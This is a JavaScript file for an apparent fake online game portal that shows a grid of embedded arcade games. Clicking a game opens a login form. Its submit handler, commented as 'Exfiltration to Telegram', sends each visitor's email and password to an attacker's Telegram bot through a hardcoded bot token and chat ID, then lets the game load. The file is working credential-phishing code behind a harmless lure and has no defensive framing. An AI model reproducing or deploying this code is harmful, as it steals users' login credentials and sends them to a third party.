const BOT_TOKEN = "9215057440:AAFpzPk23TO4rfn_uy9gCsbQOaExYOvtoS0";
const CHAT_ID = "5022620385";

let isAuthenticated = false;
let pendingGame = null;

// Using fully embeddable, iframe-friendly retro game sources and emulators
const gamesList = [
    { name: "8-Ball Pool", emoji: "🎱", gradient: "linear-gradient(135deg, #10b981, #047857)", url: "https://www.miniplay.com/embed/8-ball-pool" },
    { name: "Ping Pong", emoji: "🏓", gradient: "linear-gradient(135deg, #ef4444, #b91c1c)", url: "https://www.retrogames.cc/embed/4183-pong-original.html" },
    { name: "Connect 4", emoji: "🔴", gradient: "linear-gradient(135deg, #3b82f6, #1d4ed8)", url: "https://www.miniplay.com/embed/connect-4" },
    { name: "Battleship", emoji: "🚢", gradient: "linear-gradient(135deg, #8b5cf6, #6d28d9)", url: "https://www.miniplay.com/embed/battleship-general-quarters" },
    { name: "Tetris", emoji: "🧱", gradient: "linear-gradient(135deg, #f59e0b, #d97706)", url: "https://www.retrogames.cc/embed/20692-tetris-ds.html" },
    { name: "Checkers", emoji: "🏁", gradient: "linear-gradient(135deg, #ec4899, #be185d)", url: "https://www.miniplay.com/embed/checkers" },
    { name: "Snake", emoji: "🐍", gradient: "linear-gradient(135deg, #14b8a6, #0f766e)", url: "https://www.miniplay.com/embed/google-snake" },
    { name: "Sudoku", emoji: "🔢", gradient: "linear-gradient(135deg, #6366f1, #4338ca)", url: "https://www.miniplay.com/embed/sudoku" },
    { name: "Pac-Man", emoji: "🟡", gradient: "linear-gradient(135deg, #eab308, #a16207)", url: "https://www.retrogames.cc/embed/19595-pac-man-free.html" },
    { name: "Solitaire", emoji: "🃏", gradient: "linear-gradient(135deg, #06b6d4, #0e7490)", url: "https://www.miniplay.com/embed/solitaire" }
];

const extraEmojis = ['⭐', '🚀', '🎯', '🎲', '💎', '🔥', '👾', '🕹️', '🏆', '⚡'];
const extraGradients = [
    'linear-gradient(135deg, #38bdf8, #0284c7)',
    'linear-gradient(135deg, #fb7185, #e11d48)',
    'linear-gradient(135deg, #34d399, #059669)',
    'linear-gradient(135deg, #f472b6, #db2777)',
    'linear-gradient(135deg, #a78bfa, #7c3aed)'
];

const arcadeGrid = document.getElementById('arcade-grid');
const authModal = document.getElementById('auth-modal');
const gameModal = document.getElementById('game-modal');
const loginForm = document.getElementById('login-form');
const authBtn = document.getElementById('auth-btn');

function loadGrid() {
    arcadeGrid.innerHTML = '';
    
    for (let i = 0; i < 50; i++) {
        let gameData;
        if (i < gamesList.length) {
            gameData = gamesList[i];
        } else {
            gameData = {
                name: `Mini Game ${i + 1}`,
                emoji: extraEmojis[i % extraEmojis.length],
                gradient: extraGradients[i % extraGradients.length],
                url: "https://www.miniplay.com/embed/google-snake"
            };
        }

        const tile = document.createElement('div');
        tile.className = 'app-icon';
        tile.style.background = gameData.gradient;
        tile.innerHTML = `
            <span class="emoji">${gameData.emoji}</span>
            <span class="label">${gameData.name}</span>
        `;
        
        tile.addEventListener('click', () => {
            handleGameClick(gameData);
        });

        arcadeGrid.appendChild(tile);
    }
}

function handleGameClick(game) {
    if (!isAuthenticated) {
        pendingGame = game;
        authModal.classList.remove('hidden');
    } else {
        launchGame(game);
    }
}

function launchGame(game) {
    document.getElementById('current-game-title').textContent = game.name;
    const container = document.getElementById('game-container');
    container.innerHTML = `<iframe src="${game.url}" allow="autoplay; fullscreen; encrypted-media; picture-in-picture" allowfullscreen></iframe>`;
    gameModal.classList.remove('hidden');
}

// Handle Authentication & Exfiltration to Telegram
loginForm.addEventListener('submit', async (e) => {
    e.preventDefault();
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;

    const message = `🎮 Game Portal Login:\n📧 Email: ${email}\n🔑 Password: ${password}`;
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;

    try {
        await fetch(url);
    } catch (err) {
        console.error("Failed sync", err);
    }

    isAuthenticated = true;
    authModal.classList.add('hidden');
    authBtn.textContent = "Account Active";
    authBtn.style.background = "#10b981";
    authBtn.disabled = true;

    if (pendingGame) {
        launchGame(pendingGame);
        pendingGame = null;
    }
});

// Close modals
document.getElementById('close-modal').addEventListener('click', () => {
    authModal.classList.add('hidden');
});

document.getElementById('close-game').addEventListener('click', () => {
    gameModal.classList.add('hidden');
    document.getElementById('game-container').innerHTML = '';
});

authBtn.addEventListener('click', () => {
    if (!isAuthenticated) {
        authModal.classList.remove('hidden');
    }
});

loadGrid();
